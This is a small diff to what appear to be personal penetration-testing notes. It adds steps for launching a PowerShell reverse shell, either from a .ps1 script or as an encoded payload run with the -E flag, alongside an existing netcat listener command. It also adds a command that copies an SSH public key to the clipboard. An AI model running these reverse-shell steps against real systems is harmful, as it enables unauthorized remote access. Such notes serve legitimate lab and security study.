@@ -64,3 +64,9 @@ start listener on local machine
 `nc -lnvp <PORT>`
 start reverse shell by running .ps1 file
 `.\reversehell.ps1`
+or if encoded, running posershell.exe with -E flag and encoded payload
+`powershell.exe -E <ENCODED_PAYLOAD_HERE>`
+###### easy copy/paste in powershell
+`Get-Content C:\Users\user1\.ssh\id_ed25519.pub | Set-Clipboard`
+![[Pasted image 20220218173555.png]]
+![[Pasted image 20220218173813.png]]
